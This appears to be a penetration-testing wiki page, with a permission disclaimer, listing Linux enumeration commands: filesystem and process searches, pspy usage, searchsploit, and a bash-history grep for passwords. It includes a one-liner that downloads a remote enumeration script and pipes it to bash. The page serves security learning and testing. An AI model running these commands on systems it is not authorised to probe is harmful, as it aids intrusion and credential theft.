# Enumeration

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## Filesystem Enumeration

### Find all files a specific user has access to:

```bash
find / -user $username -ls 2>/dev/null
```

### Find all files a specific group has access to:

```bash
find / -group $groupname -ls 2>/dev/null
```

### Search bash history for passwords \(pwd search\)

```bash
find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
```

### Search filesystem by name pattern

```bash
find / -name "*PATTERN*" 2>/dev/null
```

### Search files in whole filesystem for a string \(case insensitive\)

```bash
grep -ri "STRING" / 2>/dev/null
```

### Check for useful installed programs

 only shows the ones currently installed

```bash
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```

## Process Enumeration

### Pspy

* [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

You can run `pspy --help` to learn about the flags and their meaning. The summary is as follows:

* `-p`: enables printing commands to stdout \(enabled by default\)
* `-f`: enables printing file system events to stdout \(disabled by default\)
* `-r`: list of directories to watch with Inotify. pspy will watch all subdirectories recursively \(by default, watches /usr, /tmp, /etc, /home, /var, and /opt\).
* `-d`: list of directories to watch with Inotify. pspy will watch these directories only, not the subdirectories \(empty by default\).
* `-i`: interval in milliseconds between procfs scans. pspy scans regularly for new processes regardless of Inotify events, just in case some events are not received.
* `-c`: print commands in different colors. File system events are not colored anymore, commands have different colors based on process UID.
* `--debug`: prints verbose error messages which are otherwise hidden.

The default settings should be fine for most applications. Watching files inside `/usr` is most important since many tools will access libraries inside it.

Some more complex examples:

```text
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 

# place watchers recursively in two directories and non-recursively into a third
./pspy64 -r /path/to/first/recursive/dir -r /path/to/second/recursive/dir -d /path/to/the/non-recursive/dir

# disable printing discovered commands but enable file system events
./pspy64 -p=false -f
```

### /proc

enumerate info about current processes running from: `/proc/self/status`

`ps -U root -u root ux` View all processes started by a certain user \(`root` in this case\)

## Misc

[Linux Privilege Checker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

full linux enumeration:

* [LinEnum.sh](https://github.com/rebootuser/LinEnum) 
* [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

Download **and** execute script \(such as LinEnum.sh\) \[from remote host\]: `curl $url/LinEnum.sh | bash`

Locate exploits:

```bash
searchsploit <name_of_program> 

#to pull exploit code:
searchsploit -x <name/number of exploit>
```

enumeration multi-tool: [Sparta](https://sparta.secforce.com/) \(does nmap, hydra, nikto, sqlscan, ssl...\)

Semi-automated enumeration all-in-one \(use this!\): [nmapAutomator](https://github.com/21y4d/nmapAutomator)

Unix hardening tool that can be used for enumeration: [Bastille](http://bastille-linux.sourceforge.net/)



